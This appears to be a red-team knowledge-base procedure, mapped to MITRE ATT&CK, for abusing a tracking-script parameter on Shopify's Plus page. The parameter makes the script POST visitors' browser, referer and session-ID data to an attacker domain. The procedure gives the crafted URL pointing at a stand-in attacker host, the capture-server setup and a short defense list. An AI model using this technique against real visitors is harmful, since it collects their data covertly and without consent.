---
id: uuid-proc2
tags:
  - csrf
  - information-disclosure
  - javascript
type: procedure
tools: []
tactics:
  - '[[Collection]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2024-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:27:22.396Z'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
---

# Trigger-CSRF-POST-Request-to-Leak-Data

## Summary

This procedure triggers the CSRF vulnerability by visiting the crafted URL on the Shopify plus page, causing the third-party JavaScript to send a POST request to the attacker server with leaked browser and context data, achieving information disclosure without user consent.

## Description

The vulnerability stems from a bug in the third-party JavaScript on https://www.shopify.com/plus, which sends tracking data via POST without CSRF tokens or origin checks. Upon page load with the manipulated 'insp_pingurln' parameter, it dispatches form data including 'w' (screen width), 'uid' (user ID), 'sid' (session ID), 'nv' (navigator info), 'u' (encoded URL), 'or' (origin), 'ref' (referer), 'title' (page title), 'pw' (page width), 'ph' (page height), 'pad' (padding), 'ism' (ismobile), 'dbglvl' (debug level), and 'targcv' (target canvas version with userAgent and version). This allows attackers to collect visitor data stealthily, limited to non-sensitive tracking info but useful for reconnaissance or profiling.

## Requirements

1. A crafted URL from the previous procedure with 'insp_pingurln' set to attacker endpoint
2. Victim access to a web browser (no extensions blocking requests)
3. Attacker server listening for POST requests (e.g., simple Node.js or Python HTTP server)

## Defense

Defensive measures and detection strategies:

- Audit third-party scripts for missing CSRF protections and replace with secure alternatives
- Enable browser same-origin policy enforcement and monitor cross-origin POSTs via WAF
- Log and alert on unexpected POSTs to tracking endpoints from public pages

## Objectives

1. Execute the page load to invoke the vulnerable JavaScript
2. Capture and parse the leaked data from the POST request
3. Validate the disclosure of browser and referer information

## Instructions

### Step 1: Set Up Data Capture Server

**Context**: Ensure your attacker server is running and logging incoming POST requests to verify data receipt.

For example, use a Python server: python -m http.server 80, but enhance to log POST body.

### Step 2: Visit the Malicious URL

**Context**: Load the URL in a browser to trigger the automatic POST from the JavaScript.

Direct the victim to visit https://www.shopify.com/plus?insp_pingurln=https://your-attacker-domain.com/#.

> The request fires on page load, sending multipart/form-data with parameters like u=encoded_user_agent, ref=previous_page_referer. Monitor server logs for the payload.

**Expected Output**: Server receives POST to / with fields such as w=1920, uid=random_id, ref=https://victim-site.com, title=Shopify Plus Page.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[csrf]]
- [[information-disclosure]]
- [[JavaScript]]
